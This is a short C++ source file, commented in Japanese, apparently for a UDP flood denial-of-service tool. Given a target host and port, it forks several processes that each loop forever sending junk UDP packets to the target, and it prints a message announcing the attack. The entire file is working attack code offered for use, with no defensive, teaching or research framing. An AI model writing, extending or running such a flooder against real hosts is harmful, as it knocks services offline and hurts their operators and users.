/*
*  プロキシに通しての実行は出来ないのでご了承ください。
*  もし、プロキシを通したい人がいるなら、ご自分で改造してください。＾＾
* 
*  参考
*  https://www.geekpage.jp/programming/linux-network/udp.php
*/

#include<cstdio>
#include<cstdlib>
#include<cstring>
#include<netdb.h>
#include<arpa/inet.h>

#include <sys/types.h>
#include <unistd.h>

#define THREADS 10  // <- 好きなように設定してどうぞ

int port{};
const char data[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAA";//"GET / HTTP / 1.0\r\n\r\n";

void attack(char* str)
{
    int s{};
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(str);
    addr.sin_port = htons(port);

    int(*F_sock)(int, int, int) = socket;
    int(*F_close)(int) = close;

    while (1) {
        try {
            //ソケット生成
            s = (*F_sock)(AF_INET, SOCK_DGRAM, 0);

            //データ送信
            sendto(s, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));

            //ソケットを閉じる
            (*F_close)(s);
        }
        catch (...) {
            perror("Error ");
            exit(1);
        }
    }
}

int main(int argc, char* argv[])
{
    if (getuid() != 0) {
        printf("\nsudoを付けて実行をしてね。\n\n");
        return 1;
    }
    else if (argc < 3) {
        printf("\nHow to use: %s <IP_address> <Port_number>\n\n", argv[0]);
        return 1;
    }

    struct hostent* he;
    char* str = NULL;

    //ホスト名をIPアドレスに変換
    if ((he = gethostbyname2(argv[1], AF_INET)) == NULL) {
        perror("Error ");
        return 1;
    }

    port = atoi(argv[2]);

    str = he->h_name;

    printf("\n神降臨\n\nTashiro attacking the %s.(To stop, press C + Ctrl)\n\n", str);

    void(*f)(char*) = &attack;

    //攻撃
    for (int i = 0; i != THREADS; i++) {
        if (fork()) {
            (*f)(str);
        }
    }

    return 0;
}
